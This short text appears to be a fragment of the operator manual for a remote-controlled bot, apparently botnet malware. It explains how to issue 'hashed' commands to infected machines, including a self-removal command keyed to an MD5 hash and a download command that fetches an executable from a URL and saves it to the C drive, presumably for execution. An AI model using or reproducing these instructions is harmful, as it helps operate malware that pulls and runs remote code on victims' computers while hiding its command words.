USING HASHED COMMANDS
To reduce cpu usage, you can use hashed commands by first giving command h. Examples:
To remove the bot: .h blabla (use md5checksumtest.exe to generate md5 hash of word "blabla", then put that hash into config and compile)
To download the bot: .h download http//www.com/c.exe c:\c.exe 1
